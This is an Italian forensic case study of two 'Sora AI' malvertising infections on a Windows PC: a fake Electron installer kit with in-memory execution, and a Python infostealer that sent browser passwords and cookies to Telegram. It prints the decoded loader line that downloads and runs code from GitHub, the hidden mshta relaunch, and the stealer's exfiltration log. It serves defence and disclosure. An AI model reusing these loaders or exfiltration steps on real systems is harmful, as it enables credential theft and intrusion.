# Due ondate, un solo brand: analisi forense di una doppia infezione da malvertising a tema "Sora AI" su postazione Windows

**Case study tecnico — v0.2 (6 ottobre 2026) — DOI: [10.5281/zenodo.23194008](https://doi.org/10.5281/zenodo.23194008) — tutte le versioni: [10.5281/zenodo.23170944](https://doi.org/10.5281/zenodo.23170944)**

Autore: Fabio Ghioni — ORCID: [0009-0009-0415-9434](https://orcid.org/0009-0009-0415-9434)
Data analisi: 3 ottobre 2026
Licenza proposta: CC BY 4.0

> **Nota etica.** Tutti gli identificativi della vittima sono stati rimossi e sostituiti con segnaposto (`[nome utente]`, `[nome macchina]`, `[IP pubblico vittima]`). Il token del bot Telegram è parzialmente oscurato; gli IoC di rete sono defangati secondo convenzione (`hxxp://`, `dominio[.]com`). Nessun campione eseguibile è incluso in questa pubblicazione.

---

## Abstract

Presentiamo l'analisi forense post-mortem di una postazione Windows 10/11 colpita da **due distinte campagne di malvertising** che sfruttavano il brand "Sora" (il generatore video di OpenAI) come esca, a distanza di cinque settimane l'una dall'altra (dicembre 2024 – gennaio 2025). La prima campagna distribuiva una **falsa applicazione desktop Electron** ("SoraAI 1.0.6") che si è rivelata essere un **kit commerciale di generazione di falsi installer** con modello ad affiliazione, loader JavaScript offuscato, dead drop su Google Calendar e un modulo nativo Rust capace di eseguire payload EXE interamente in memoria. La seconda campagna distribuiva un **infostealer Python** riconducibile allo schema Braodo Stealer, con persistenza tramite chiave Run, esfiltrazione verso l'API Telegram e targeting specifico degli account pubblicitari Facebook. Per la seconda infezione disponiamo del **log di debug lasciato dal malware stesso**, che documenta il furto confermato di 19 password, 504 cookie di sessione e una carta di credito. Il caso è rilevante per tre motivi: (1) il kit Electron è stato recuperato **con l'intero ambiente di sviluppo dell'autore**, inclusi ID affiliato, infrastruttura e percorso della macchina di build; (2) entrambe le catene d'attacco hanno aggirato le difese antivirus dell'host per mesi (la persistenza è sopravvissuta **21 mesi**, fino alla bonifica manuale); (3) documentiamo dal lato vittima il ciclo di vita di uno stealer "orfano" del proprio C2. Rilasciamo IoC, regole YARA e metodologia per la riproducibilità.

**Parole chiave:** malvertising, infostealer, Braodo Stealer, Electron, malware-as-a-service, esecuzione fileless, Telegram C2, digital forensics, fake AI apps

---

## 1. Introduzione

Il successo mediatico dei generatori video basati su IA ha creato un terreno fertile per campagne di malvertising che impersonano marchi noti. Tra il dicembre 2024 e il gennaio 2025 la postazione analizzata è stata infettata due volte da falsi software "Sora AI", entrambi promossi tramite annunci sponsorizzati sui social network. I due attacchi sono **indipendenti tra loro** (infrastrutture, toolchain e autori diversi) ma condividono la stessa esca tematica, offrendo un'occasione rara di confronto tra due filoni del cybercrime-as-a-service:

- **Campagna A (dicembre 2024):** falso installer desktop "SoraAI", un kit Electron/Nuxt con economia ad affiliazione (pay-per-install), esecuzione fileless tramite modulo Rust.
- **Campagna B (gennaio 2025):** falso video `.mp4` (in realtà un eseguibile `.com`) che installa un infostealer Python della famiglia/schema Braodo, orientato al furto di account pubblicitari Facebook.

L'analisi è stata condotta il 3 ottobre 2026, a ~21 mesi dalla seconda infezione, su richiesta del proprietario della macchina. La persistenza del secondo malware era ancora attiva a quella data.

### 1.1 Contributi

1. Documentazione completa, con evidenze primarie, di un **kit MaaS di falsi installer "AI"** recuperato con sorgenti, configurazione (`.env`), ID affiliato e percorsi di build della macchina dell'autore.
2. Analisi statica multi-livello dello script batch di persistenza `9a.bat`, incluse tecniche di offuscamento finora poco documentate in letteratura divulgativa (falso BOM UTF-16, assemblaggio runtime di comandi tramite substring di variabili d'ambiente, dead code aritmetico).
3. Osservazione dal lato vittima di un'**esfiltrazione Braodo-like verso Telegram**, con log di debug del malware che conferma tempi, contenuti e canale del furto.
4. Evidenza empirica del **fallimento prolungato della difesa AV basata su firme** contro minacce a bassa rumorosità, con discussione delle implicazioni.

---

## 2. Metodologia

L'analisi è stata eseguita sulla macchina live, previa creazione di copie di tutte le evidenze con calcolo degli hash SHA256 al momento dell'acquisizione. Le fonti utilizzate:

| Fonte | Uso |
|---|---|
| Cronologia e download di Chrome/Edge | Ricostruzione dei vettori iniziali (URL, referrer, parametri annunci) |
| Database **SRUDB.dat** (System Resource Usage Monitor, ~68 MB, preservato) | Timeline di esecuzione dei processi nel tempo |
| Log Windows **Shell-Core** (evento 9707) | Conferma delle esecuzioni a ogni logon della persistenza |
| Registro di sistema (HKCU Run, uninstall) | Persistenza e voce di disinstallazione, con **backup .reg prima della rimozione** |
| Metadati file system (timestamp di creazione/modifica) | Ricostruzione della sequenza di installazione |
| Analisi statica | `app.asar` (Electron), `9a.bat` (batch offuscato), `lib.rs`/`Cargo.toml` (modulo Rust) |
| Log residui del malware | `main.log` (app SoraAI), log di debug dello stealer |

Tutti gli hash dei file rilevanti sono riportati in Appendice B. Le rimozioni sono state eseguite solo dopo il backup delle chiavi di registro interessate e lo spostamento (non cancellazione) delle cartelle incriminate.

---

## 3. Campagna A — la falsa app "SoraAI" (dicembre 2024)

### 3.1 Vettore iniziale

- **11/12/2024 02:57:02** — download di `InstallSoraAI.exe` (122.959.664 byte) dalla pagina `hxxps://openai-index-sora-video[.]com/`, servito tramite `hxxps://appliedaibusiness[.]com/api/p_b?uuid=tl4fA1JcPR&icon=sora&name=InstallSoraAI.exe`.
- Un'installazione precedente era già avvenuta alle **00:15:03** (creazione della cartella dati dell'app); l'app è stata avviata **3 volte** (00:15:06, 00:24:40, 02:59:44; fonte: `main.log`).
- Installazione in `C:\Users\[nome utente]\AppData\Local\Programs\sora\`, con eseguibile `SoraAI.exe` **non firmato** ("Company: OpenAiLLC", compilazione 09/12/2024 15:03), voce di disinstallazione e collegamento nel menu Start.

### 3.2 Funzionamento

L'applicazione è un pacchetto **Electron/Nuxt**. All'apertura mostra una finta finestra "Install"; al click dell'utente, l'handler IPC `invoke-start-install` richiama la funzione `jumpUp()` (modulo `outMutation.js`), che esegue un loader JavaScript offuscato in base64. **Microsoft Defender classifica il loader come `Trojan:JS/GlassWorm.HAF!MTB` (gravità 5)** — rilevamento avvenuto solo in fase di analisi, non al momento dell'infezione.

La catena osservata nel codice:

1. Il loader recupera l'URL del payload da un **evento di Google Calendar usato come dead drop** (`hxxps://calendar.app.google/Cib52LrMMujMewsE9`): una tecnica di *dead drop resolver* che sfrutta l'infrastruttura legittima e fidata di Google per rendere l'URL del payload sostituibile e resistente al takedown.
2. Scarica uno script cifrato (header HTTP `ivbase64` e `secretkey`) e lo decifra.
3. Un **modulo nativo Rust** (binding Neon, crate `memexec` 0.2) **esegue l'EXE direttamente in memoria** (`memexec::memexec_exe(&data)`), senza mai scriverlo su disco: esecuzione fileless che neutralizza la scansione on-write degli AV.
4. Una funzione anti-analisi (`checkProcess.js`) termina l'app se rileva uno qualsiasi di **42 strumenti di analisi** (Wireshark, Process Hacker, x64dbg, IDA, OllyDbg, procmon, VM guest tools VMware/VirtualBox/Xen/QEMU, ecc.).

### 3.3 Il kit: ambiente di sviluppo completo lasciato nel pacchetto

L'elemento di maggior valore per la ricerca: l'`app.asar` contiene **l'intero ambiente di sviluppo dell'autore**, non solo il codice di produzione:

- **`.env` in chiaro** con la configurazione della campagna:
  - `HOST=hxxp://82.197.67[.]174` — server payload (Contabo GmbH, Germania);
  - `REDIS=redis://45.93.20[.]174:6379` — server di tracciamento (UFO Technologies Ltd, GB);
  - `PARTENER_ID=6PHM9GG3zOACOOY` — **ID affiliato**: il kit opera con modello a provvigione (pay-per-install); chi diffonde le build viene pagato per ogni installazione;
  - `OFFER=sora` — la "campagna" corrente.
- **Link payload:** `hxxp://82.197.67[.]174/13NVrZ4CkIbW3Ije19dJKw==` (con corrispondente base64 per-affiliato in `link.txt`).
- **Pagina post-installazione:** `hxxps://replicate-6phm9gg3zoacooy.app-tools[.]info/explore` — il sottodominio incorpora l'ID affiliato in minuscolo.
- **`readme.txt` con istruzioni per gli sviluppatori** e percorso della macchina dell'autore: `M:\electron\electron\load.js`.
- **`Cargo.toml` del modulo Rust**, con dipendenze `memexec`, `cryptify` (offuscamento stringhe), `neon`, e profilo di release ottimizzato per "cryptablity" [sic].
- **Set di icone per decine di marchi da imitare**: Sora, Haiper, Leonardo AI, MidJourney, Ideogram, Runway, PicsArt, Akool, Uizard, Slidesgo, Postman, Chrome, Opera, Mozilla, Meta. Il kit è un **generatore di falsi installer multi-campagna**: cambiare esca richiede solo cambiare `OFFER` e l'icona.

### 3.4 Attribuzione

Un commento in russo in `helper.js` (copiato dalla documentazione MDN in lingua russa) è un indizio debole di sviluppatore russofono; il modello economico ad affiliazione è coerente con l'ecosistema PPI russofono. **Nessuna attribuzione forte è possibile.** Non sono state trovate tracce del payload finale né di persistenza: non è determinabile se il payload in memoria sia stato effettivamente eseguito.

---

## 4. Campagna B — infostealer Python "Braodo-like" (gennaio 2025)

### 4.1 Vettore iniziale

- **16/01/2025 03:24:21** — da Chrome viene scaricato `C:\Users\[nome utente]\Videos\video_for_you.mp4 - openai.com` (119.849.552 byte). L'estensione reale è **`.com`**, eseguibile Windows camuffato da video (doppia estensione + spazi, tecnica T1036).
- Pagina di provenienza: `hxxps://aisoraplus[.]com/`, raggiunta da un **annuncio sponsorizzato Facebook/Instagram** (parametro `fbclid` con campi `aem` e `adid`, tipici dei click su ads).
- File ospitato su **Dropbox**: `hxxps://www.dropbox[.]com/scl/fi/p4qqb4itbnnzyaaiaonz4/video_for_you.mp4-openai.com?rlkey=...`

### 4.2 Installazione e persistenza

- **03:26:00** — creazione di `C:\Users\Public\Downloads\xmetavip2\`: un **runtime Python 3.10 portatile** con `pythonw.exe` rinominato `pw.exe` e librerie `Crypto`, `requests`, `websocket`, `pywin32`.
- **03:26:04** — prima esecuzione.
- Persistenza: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, valore **`WindowsSecurity`** (nome scelto per mimetizzarsi tra voci legittime) → `C:\Users\Public\Downloads\xmetavip2\9a.bat`.
- Il log Shell-Core (evento 9707) conferma l'esecuzione **a ogni accesso utente**, l'ultima il **02/10/2026 18:25** — 21 mesi di persistenza attiva.

### 4.3 Analisi di `9a.bat` (94.437 byte)

Lo script è protetto da **almeno cinque livelli di offuscamento**, qui documentati per la prima volta in questa combinazione:

1. **Falso BOM UTF-16** (`FF FE`) in testa a un file in realtà ANSI: induce editor e parser a decodificare il contenuto come UTF-16 producendo rumore CJK illeggibile, mentre `cmd.exe` lo esegue correttamente.
2. **Variabili d'ambiente spazzatura**: ogni carattere dei comandi è intervallato da token `%JunkName%` non definiti (espansi a stringa vuota da cmd), inclusi nomi con simboli (`%ws)uP%`, `%(Zbx#AU%`) che rompono i regex ingenui di deoffuscamento.
3. **Labirinto di label e goto**: ~120 label numeriche (123 nel campione) (`:615066`, `:630912`, …) con `goto` a etichette apparentemente inesistenti (`;,;`, `,`), reso possibile da una logica di flusso non lineare.
4. **Dead code aritmetico**: decine di istruzioni `set /a ans=<espressione esadecimale/ottale>` prive di effetto, che aumentano l'entropia statistica e affaticano l'analisi.
5. **Assemblaggio runtime del comando finale**: il payload non esiste mai in chiaro nel file. I caratteri vengono estratti a runtime tramite substring di variabili d'ambiente presenti su ogni Windows (`%DRIVERDATA:~-34,1%`, `%PROGRAMFILES(X86):~-17,1%`, `%LOCALAPPDATA:~-12,1%`) e da una stringa charset personalizzata (`KDOT=PS7sU4zhlIiMLyRCncv3tKbZXEfx5pjrOVmA1BgH9GNk2J0Y8FWd6QqDuoTaew`), la cui definizione è a sua volta intervallata da variabili spazzatura: si legge in chiaro solo dopo aver tolto il livello 2, mentre i suoi richiami (`%KDOT:~17,1%`) sono in chiaro già nel file grezzo.

Il comportamento decodificato (confermato dall'analisi statica):

1. **Rilancio nascosto di sé stesso** tramite `mshta vbscript:CreateObject("WScript.Shell").Run(...,0)`. L'argomento `vbscript:createobject("wscript.shell").run("""%~s0"" …,0)` è in chiaro nel file; il nome del comando `mshta` viene assemblato a runtime ed è assente in chiaro sia nel file grezzo sia dopo aver tolto il livello 2.
2. **Esecuzione dello stealer** tramite il runtime portatile:
   `pw.exe -c "import base64;exec(base64.b64decode('...'))"`
   che si riduce a:
   `exec(base64.b64decode(urllib.request.urlopen('hxxps://raw.githubusercontent[.]com/hacker9xclone/111/refs/heads/master/mrxw').read()))`
   — il codice dello stealer viene **scaricato da GitHub ed eseguito in memoria** a ogni avvio: lo script su disco è solo un loader di 4 righe logiche, il che spiega l'invisibilità pluriennale alle firme AV.

### 4.4 Esfiltrazione e dati sottratti (furto confermato)

Il malware ha lasciato sulla macchina il proprio **log di debug**, che documenta in dettaglio l'attività del 16/01/2025:

- **03:26:07–03:26:13** — connessione alla **porta di debug remoto dei browser** (`localhost:9222`, tecnica di estrazione cookie che aggira la cifratura di Chrome/Edge), interrogazioni a `adsmanager.facebook.com`, `business.facebook.com` e **Graph API v17.0** (`me/adaccounts`, `me?fields=businesses`, `me/facebook_pages` con fan_count/verification_status, `me/groups` con admin/member_count) per profilare gli asset pubblicitari Facebook della vittima. Nel caso specifico tutte le chiamate Graph falliscono (`access_token=False`): nessun token Facebook trovato.
- **03:26:13** — geolocalizzazione via `ip-api[.]com`; compressione della cartella raccolta (`All_Passwords.txt`, `Facebook_Cookies.txt`, `Cookies Browser\Edge_Default.txt`) in `[IT_[IP pubblico vittima]] [nome macchina].zip`. I messaggi di log sono **in vietnamita**.
- **03:26:14** — invio tramite **Telegram Bot API**:
  - Bot ID `7692901771` (token parzialmente oscurato in questa pubblicazione);
  - chat di destinazione `-1002407933384` (supergruppo/canale);
  - metodo `sendDocument` con `protect_content=True` (impedisce l'inoltro nel client Telegram — accortezza operativa dell'attaccante);
  - didascalia: `IP: [IP pubblico vittima] / Country: IT - Italy / User: [nome utente] / Browser Data: CK: 504 | PW: 19 | CC: 1`.

**Bottino confermato: 19 password salvate nei browser, 504 cookie di sessione, 1 carta di credito, IP/paese/utente/nome macchina.** Il furto di cookie di sessione è particolarmente grave: consente il *session hijacking* anche su account protetti da 2FA.

### 4.5 Attribuzione

Lo schema coincide con **Braodo Stealer**, documentato da Splunk e attribuito ad attori vietnamiti: medesimo targeting degli account pubblicitari Facebook, hosting del payload su GitHub, esfiltrazione via Telegram, log in vietnamita. L'account GitHub `hacker9xclone` risultava attivo almeno dal 2020 (fork di un keylogger C++ nell'ottobre 2020; il repository `111` usato come hosting del payload era vuoto a dicembre 2020). **Alla data dell'analisi l'account è stato rimosso** (HTTP 404) e il payload `mrxw` non è più recuperabile né da GitHub né da Wayback Machine.

### 4.6 Uno stealer "orfano": 21 mesi di esecuzioni a vuoto

Il file contatore del malware vale `1` e il log non è stato aggiornato dopo il 16/01/2025. Con ogni probabilità il furto completo è avvenuto **una sola volta**; le esecuzioni successive a ogni logon (fino al 02/10/2026) fallivano silenziosamente dopo la rimozione dell'account GitHub che ospitava il payload. Non è dimostrabile al 100%: non si può escludere che in qualche finestra temporale il payload sia stato nuovamente raggiungibile. Il caso illustra un aspetto poco documentato: la persistenza di un loader resta attiva **anni dopo la morte della sua infrastruttura**, continuando a rappresentare un rischio (riattivazione del C2, rilevamento come falso negativo "benigno" da firma).

---

## 5. Indicatori di compromissione (selezione)

Elenco completo in `iocs.csv` nel repository accompagnatorio. Tutti defangati.

**Rete**
- `openai-index-sora-video[.]com`, `appliedaibusiness[.]com`, `aisoraplus[.]com`, `app-tools[.]info`
- `82.197.67[.]174` (payload server, Contabo), `45.93.20[.]174:6379` (Redis tracking)
- `calendar.app.google/Cib52LrMMujMewsE9` (dead drop)
- `raw.githubusercontent[.]com/hacker9xclone/111/refs/heads/master/mrxw`
- Telegram bot `7692901771`, chat `-1002407933384`

**Host**
- `%PUBLIC%\Downloads\xmetavip2\` (runtime Python portatile, `pw.exe`)
- `%LOCALAPPDATA%\Programs\sora\`, `%APPDATA%\sora`, `%LOCALAPPDATA%\sora-updater`
- `HKCU\...\Run\WindowsSecurity` → `9a.bat`
- File mascheratura: `video_for_you.mp4 - openai.com` (doppia estensione)

**Hash SHA256** (principali)
- `9a.bat`: `197F763BCD619F96E8C8C9074C9F483CCDB31E49B6E51C115D086A48BED17DE0`
- `pw.exe` (pythonw.exe legittimo firmato PSF): `FF507B25AF4B3E43BE7E351EC12B483FE46BDBC5656BAAE6AD0490C20B56E730`
- `SoraAI.exe`: `9777AC1267C9EE6EBC57468DD25F1714F9120583A875164DD015C030D5DEBBF6`
- `app.asar`: `5BD2DDD90BB5451BA1CA6662E8F45B2A89DE5F9287CC4F4B5E8E9A68B00A90C6`
- `node.exe` scaricato dal malware (Node.js 22.9.0 x86 legittimo): `317AEAFE7DFEB5093534FE0BE6DE946C302BB39C40BA8DE47BC51A8B305AFAD3`

---

## 6. Mappatura MITRE ATT&CK

| Tattica | Tecnica | Campagna | Evidenza |
|---|---|---|---|
| Resource Development | T1608.001 Upload Malware | B | dropper ospitato su Dropbox, payload su GitHub |
| Initial Access | T1189 Drive-by Compromise | A, B | malvertising su social |
| Execution | T1059.007 JavaScript | A | loader JS offuscato |
| Execution | T1059.003 Windows Command Shell | B | 9a.bat |
| Execution | T1059.006 Python | B | pw.exe -c |
| Execution | T1204.002 User Execution: Malicious File | A, B | click sul falso installer / falso video |
| Execution | T1218.005 Mshta | B | rilancio nascosto via mshta/vbscript |
| Persistence | T1547.001 Registry Run Keys | B | Run\WindowsSecurity |
| Defense Evasion | T1620 Reflective Code Loading | A | memexec (EXE in memoria) |
| Defense Evasion | T1036.007 Double File Extension | B | `.mp4 - openai.com` |
| Defense Evasion | T1027 Obfuscation | A, B | loader base64; 9a.bat a 5 livelli |
| Defense Evasion | T1027.013 Encrypted/Encoded File | A | payload con ivbase64/secretkey |
| Defense Evasion | T1497.001 System Checks | A | checkProcess anti-analisi (42 tool) |
| Defense Evasion | T1036.003 Rename Legitimate Utilities | B | pw.exe = pythonw.exe legittimo rinominato |
| Credential Access | T1555.003 Credentials from Web Browsers | B | 19 password |
| Credential Access | T1539 Steal Web Session Cookie | B | 504 cookie via debug port 9222 |
| Collection | T1005 Data from Local System | B | raccolta e compressione zip |
| C2 | T1102.001 Dead Drop Resolver | A | evento di Google Calendar che contiene l'URL del payload |
| C2 | T1105 Ingress Tool Transfer | A, B | script cifrato dal server payload; `mrxw` da raw.githubusercontent |
| C2 | T1071.001 Web Protocols | B | Telegram Bot API |
| Exfiltration | T1567 Exfiltration Over Web Service | B | sendDocument verso chat Telegram tramite Bot API |
| Exfiltration | T1041 Exfiltration Over C2 Channel | B | HTTPS verso api.telegram.org |

---

## 7. Discussione: perché l'antivirus non ha visto nulla per 21 mesi

Entrambe le catene d'attacco condividono una proprietà strutturale: **ogni componente su disco è, preso singolarmente, benigno o quasi.**

- Campagna A: un'app Electron legittima nell'aspetto, il cui unico comportamento ostile è decodificato ed eseguito in memoria; l'EXE malevolo non tocca mai il file system (memexec); l'URL del payload è nascosto dietro un servizio fidato (Google Calendar).
- Campagna B: un interprete Python firmato dalla Python Software Foundation, rinominato; uno script `.bat` il cui contenuto ostile non esiste in forma statica (assemblato a runtime); il codice dello stealer risiede su GitHub, dominio fidato, e viene eseguito in memoria.

La scansione su firma opera sul contenuto dei file a riposo: qui **non c'è quasi nulla a riposo**. Il rilevamento di Defender (`GlassWorm.HAF!MTB`) sul loader JS della campagna A è avvenuto solo perché le firme sono state aggiornate **dopo** — e comunque non ha prodotto né quarantena né rimozione della persistenza della campagna B, sopravvissuta altri 21 mesi fino alla bonifica manuale guidata da analisi umana.

**Verifica del 6 ottobre 2026.** Su un'altra postazione Windows 11, una scansione personalizzata di Microsoft Defender su un archivio non cifrato contenente `9a.bat` (`MpCmdRun -Scan -ScanType 3 -DisableRemediation`, modalità che esamina anche il contenuto degli archivi; definizioni 1.459.574.0 del 5 ottobre 2026) ha restituito *found no threats*. A ventuno mesi dall'infezione il loader supera ancora le firme statiche di Defender.

Le contromisure che avrebbero intercettato l'attacco sono di altra natura: **EDR comportamentale** (relazione padre-figlio `mshta → cmd → pw.exe`, accesso alla debug port dei browser), **restrittività applicativa** (WDAC/AppLocker su `%PUBLIC%`), **ispezione TLS con threat intel su domini** (raw.githubusercontent verso repo appena creati, Dropbox per eseguibili), e soprattutto **igiene d'uso**: nessun software desktop "AI" gratuito scaricato da annunci social.

---

## 8. Bonifica e raccomandazioni (sintesi operativa)

Interventi del 03/10/2026: backup e rimozione della voce Run `WindowsSecurity`; spostamento nel Cestino di `xmetavip2`, delle cartelle `sora` e della voce di disinstallazione; verifica negativa di altre persistenze (task pianificati, servizi, WMI, IFEO, Winlogon, hosts, proxy).

Raccomandazioni post-incidente applicate: blocco della carta di credito salvata nel browser; cambio di tutte le password da dispositivo pulito; **"Esci da tutti i dispositivi" su ogni servizio** (i cookie rubati bypassano la 2FA); revoca e rigenerazione di token/chiavi API; scansione Microsoft Defender Offline. Segnalazioni di abuse: Telegram (bot 7692901771), Contabo, Dropbox, Google (Calendar), Meta (annuncio).

---

## 9. Limiti dell'analisi

- Payload finale della campagna A non recuperato: ignoto se e cosa sia stato eseguito in memoria il 11/12/2024.
- Payload `mrxw` della campagna B non più disponibile (account GitHub rimosso): l'analisi dello stealer si basa sul suo log e sul comportamento osservato, non sul codice completo.
- Non è escludibile che lo stealer abbia esfiltrato ulteriori dati in finestre successive al 16/01/2025, sebbene le evidenze (contatore=1, log non aggiornato) lo rendano improbabile.
- Attribuzione della campagna A: solo indizi deboli.

---

## 10. Disponibilità del materiale

- Repository GitHub (IoC, YARA, analisi deoffuscazione, documentazione): https://github.com/anckhalion/security-research/tree/main/cases/001-sora-ai-malvertising
- Campione `9a.bat`: condiviso con la comunità di ricerca tramite **MalwareBazaar (abuse.ch)** dentro l'archivio SHA256 [`419f513be822e01ebc1494ac1c20d78de701eaeae5fa025625550ee518c41a5f`](https://bazaar.abuse.ch/sample/419f513be822e01ebc1494ac1c20d78de701eaeae5fa025625550ee518c41a5f/) (zip, password `infected`), che contiene `9a.bat` (SHA256 `197F763BCD619F96E8C8C9074C9F483CCDB31E49B6E51C115D086A48BED17DE0`) e un README. La pagina dell'archivio riporta fra i contenuti anche l'hash dello script. Il 6 ottobre 2026 lo stesso file è stato caricato anche come voce autonoma: [`197f763b…`](https://bazaar.abuse.ch/sample/197f763bcd619f96e8c8c9074c9f483ccdb31e49b6e51c115d086a48bed17de0/).
- Altre evidenze sensibili (SRUDB.dat, registro completo del log con token): **non pubblicate**; disponibili per ricercatori accreditati su richiesta motivata.
- Questo paper è depositato su Zenodo: questa versione (v0.2) [10.5281/zenodo.23194008](https://doi.org/10.5281/zenodo.23194008); tutte le versioni, che rimandano all'ultima, [10.5281/zenodo.23170944](https://doi.org/10.5281/zenodo.23170944); v0.1 [10.5281/zenodo.23170945](https://doi.org/10.5281/zenodo.23170945).

## Appendice A — Timeline consolidata

| Data/ora | Evento |
|---|---|
| 11/12/2024 00:15:03 | Prima installazione falsa app SoraAI |
| 11/12/2024 00:15:06 / 00:24:40 / 02:59:44 | Tre avvii dell'app |
| 11/12/2024 02:57:02 | Download `InstallSoraAI.exe` |
| 16/01/2025 03:24:21 | Download falso `.mp4` da annuncio Facebook/Instagram |
| 16/01/2025 03:26:00 | Creazione runtime `xmetavip2` |
| 16/01/2025 03:26:14 | **Esfiltrazione su Telegram confermata** |
| 16/01/2025 → 02/10/2026 | Persistenza attiva, esecuzione a ogni logon |
| 03/10/2026 | Analisi e bonifica; conservazione evidenze |

## Appendice B — Hash completi

Vedi i due file `hash_sha256.csv` nel corpus accompagnatorio (campagna B: `9a.bat`, `pw.exe`, `python310.dll`; campagna A, in `sora_fake_app/`: `SoraAI.exe`, `app.asar`, `Uninstall SoraAI.exe`, `elevate.exe`). L'hash di `node.exe` è in `sora_fake_app/node_runtime_scaricato.txt`.

## Appendice C — Estratto del log dello stealer (redatto)

```
2025-01-16 03:26:07 - DEBUG - Starting new HTTP connection (1): localhost:9222
2025-01-16 03:26:13 - INFO  - Đang thêm: C:\Users\[nome utente]\...\All_Passwords.txt
2025-01-16 03:26:13 - INFO  - Thư mục ... đã được nén thành ...\[IT_[IP pubblico vittima]] [nome macchina].zip
2025-01-16 03:26:14 - DEBUG - api.telegram.org "POST /bot7692901771:[TOKEN OSCURATO]/sendDocument
    ?chat_id=-1002407933384&caption=IP: [IP pubblico vittima] Country: IT - Italy
    User: [nome utente] Browser Data: CK: 504|PW: 19|CC: 1 &protect_content=True" 200
```

## Registro delle modifiche

- **v0.2, 06/10/2026** — Versione rivista dopo il confronto con il campione e con la voce di MalwareBazaar: il §10 rimanda alla voce reale di MalwareBazaar (archivio `419f513b…`, che contiene `9a.bat` `197F763B…`); il §7 aggiunge la verifica con Defender; il §4.3 precisa il numero di label, la definizione del charset e l'assemblaggio di `mshta`; il §6 rivede la mappatura ATT&CK (T1102.001, T1105, T1036.003, T1567, T1204.002, T1608.001); l'Appendice B indica dove si trova ciascun hash.
- **v0.1, 06/10/2026** — Prima pubblicazione, [10.5281/zenodo.23170945](https://doi.org/10.5281/zenodo.23170945).
